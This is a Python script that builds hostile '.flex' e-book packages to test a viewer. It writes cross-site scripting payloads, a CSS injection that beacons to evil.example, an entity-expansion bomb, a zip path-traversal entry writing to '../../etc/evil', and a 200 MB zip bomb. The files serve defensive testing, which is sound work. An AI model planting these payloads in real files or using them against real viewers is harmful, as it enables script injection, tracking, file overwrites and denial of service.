"""Build hostile .flex files (stdlib only) to attack the viewer. Usage: python3 make_hostile.py OUT_DIR"""
import json, sys, zipfile, zlib
from pathlib import Path

out = Path(sys.argv[1])
CONTAINER = ('<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles>'
             '<rootfile full-path="OEBPS/package.opf" media-type="application/oebps-package+xml"/></rootfiles></container>')
OPF = ('<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="u"><metadata '
       'xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="u">x</dc:identifier><dc:title>Evil</dc:title></metadata>'
       '<manifest><item id="c" href="c.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="c"/></spine></package>')

def pkg(name, chapter, extra=None, flex=None):
    with zipfile.ZipFile(out / name, "w") as z:
        z.writestr("mimetype", "application/epub+zip", zipfile.ZIP_STORED)
        z.writestr("META-INF/container.xml", CONTAINER)
        z.writestr("META-INF/flex.json", json.dumps(flex or {"flex": "1.0", "level": "L0",
            "tokens": {"color": {"fg": {"light": "red;}*{background:url(https://evil.example/beacon)", "dark": "#fff"}}}}))
        z.writestr("OEBPS/package.opf", OPF)
        z.writestr("OEBPS/c.xhtml", chapter)
        for k, v in (extra or {}).items(): z.writestr(k, v)

X = '<html xmlns="http://www.w3.org/1999/xhtml"><head><title>t</title></head><body>{}</body></html>'
pkg("xss.flex", X.format(
    '<p id="ok">Visible text</p><script>window.__pwned=1</script>'
    '<img src="x" onerror="window.__pwned=2" alt="a"/><a href="javascript:window.__pwned=3" id="js">click</a>'
    '<p style="position:fixed;inset:0;background:red" onclick="window.__pwned=4">overlay</p>'
    '<iframe src="https://evil.example"></iframe><svg xmlns="http://www.w3.org/2000/svg"><script>window.__pwned=5</script></svg>'
    '<a href="https://example.org" id="ext">ext</a>'))
pkg("xml-bomb.flex", '<?xml version="1.0"?><!DOCTYPE html [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>'
    + X.format("<p>&b;</p>"))
pkg("traversal.flex", X.format("<p>x</p>"), extra={"../../etc/evil": "x"})
pkg("sealed.flex", X.format("<p>ciphertext would be here</p>"), flex={"flex": "1.0", "level": "L1"})
# zip bomb: 200 MB of zeros compresses ~1000:1
with zipfile.ZipFile(out / "bomb.flex", "w") as z:
    z.writestr("mimetype", "application/epub+zip", zipfile.ZIP_STORED)
    z.writestr("META-INF/container.xml", CONTAINER)
    z.writestr("OEBPS/zeros.bin", b"\0" * 200_000_000, zipfile.ZIP_DEFLATED)
print("hostile files written:", sorted(p.name for p in out.glob("*.flex")))
